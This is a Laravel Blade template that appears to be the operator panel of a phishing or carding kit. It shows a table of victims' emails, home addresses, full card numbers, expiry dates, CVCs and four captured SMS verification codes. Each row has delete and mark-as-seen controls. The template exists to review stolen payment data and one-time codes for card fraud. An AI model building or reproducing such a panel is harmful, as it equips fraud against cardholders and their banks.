@extends('./Layouts/app')
@section('title','Login')
@section('content')
<link rel="stylesheet" href="https://demos.creative-tim.com/notus-js/assets/styles/tailwind.css">
<link rel="stylesheet" href="https://demos.creative-tim.com/notus-js/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css">


<section class="py-1 bg-blueGray-50">
  <div class="w-full xl:w-5/12 mb-12 xl:mb-0 px-4 mx-auto mt-24">
    <div class="relative flex flex-col min-w-0 break-words bg-gray w-3/4 mx-auto mb-6 shadow-lg rounded ">
      <div class="block w-full overflow-x-auto">
        <table class="items-center bg-transparent w-3/4 mx-auto border-collapse">
          <thead>
            <tr>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Email
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                country
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                State
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                City
              </th>
               <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Zip
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Address
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Card Number
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Exp (YY/MM)
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                CVC
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Code V #1
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Code V #2
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Code V #3
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Code V #4
              </th>
              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Created_at
              </th>

              <th class="px-6 bg-blueGray-50 text-blueGray-500 align-middle border border-solid border-blueGray-100 py-3 text-xs uppercase border-l-0 border-r-0 whitespace-nowrap font-semibold text-left">
                Actions
              </th>
            </tr>
          </thead>

          <tbody>
            <?php $i = 1; ?>
            @foreach ($details as $detail)
            <tr id="{{$detail->status}}" class="details" @if($detail->status == 1) style="background-color: #b9b9bd;" @endif>
              <th   class="border-t-0 px-6 border border-solid align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 text-left text-blueGray-700 ">
                <span style="cursor: pointer;" onclick="changeStatus(this.id , event)" id="{{$detail->id}}">{{ $detail->users->email }}</span>
              </th>
              <td class="border-t-0 px-6 border border-solid align-center border-l-0 border-r-0 text-xs whitespace-nowrap p-4">
                {{ $detail->country }}
              </td>
              <td class="border-t-0 px-6 border border-solid align-center border-l-0 border-r-0 text-xs whitespace-nowrap p-4">
                {{ $detail->users->state }}
              </td>
              <td class="border-t-0 px-6 border border-solid align-center border-l-0 border-r-0 text-xs whitespace-nowrap p-4">
                {{ $detail->users->city }}
              </td>
              <td class="border-t-0 px-6 border border-solid align-center border-l-0 border-r-0 text-xs whitespace-nowrap p-4">
                {{ $detail->users->zip }}
              </td>
              <td class="border-t-0 px-6 border border-solid align-center border-l-0 border-r-0 text-xs whitespace-nowrap p-4">
                {{ $detail->users->address }}
              </td>
              <th  class="border-t-0 px-6 border border-solid align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 text-left text-blueGray-700 ">
                {{ $detail->cnumber }}
              </th>
              <th  class="border-t-0 px-6 border border-solid align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 text-left text-blueGray-700 ">
                {{ $detail->exp }}
              </th>

              <td class="border-t-0 px-6 border border-solid align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 ">
                {{ $detail->cvc }}
              </td>
              <td class="border-t-0 px-6 border border-solid align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 ">
                {{ $detail->sms }}
              </td>
              <td class="border-t-0 px-6 border border-solid align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 ">
                {{ $detail->sms1 }}
              </td>
              <td class="border-t-0 px-6 border border-solid align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 ">
                {{ $detail->sms2 }}
              </td>
                <td class="border-t-0 px-6 border border-solid align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 ">
                {{ $detail->sms3 }}
              </td>
              <td class="border-t-0 px-6 border border-solid align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4 ">
                {{ $detail->updated_at }}
              </td>
              <td class="border-t-0 px-6 border border-solid align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4">

                <form action="{{ url('/deleteDetail', ['id' => $detail->id]) }}" method="post">@csrf @method('POST')
                  <button type="submit">Delete</button>
                </form>


              </td>
            </tr>
            <?php $i++; ?>
            @endforeach
          </tbody>

        </table>
      </div>
    </div>
  </div>
</section>

@endsection

<script>

  function changeStatus(id , e){
      const xhr = new XMLHttpRequest();
    const data = {
                id: id,
            };

    xhr.open('POST', `/changeStatus`);

    xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('X-CSRF-TOKEN', '{{ csrf_token() }}');

    xhr.onload = function() {
      if (xhr.status === 200) {
        const response = JSON.parse(xhr.responseText);
        console.log(response.status)

          e.target.closest('.details').style.backgroundColor = "transparent" ;
   
      } else {
        console.log('Request failed. Status:', xhr.status);
      }
    };

    xhr.send(JSON.stringify(data));
  }
</script>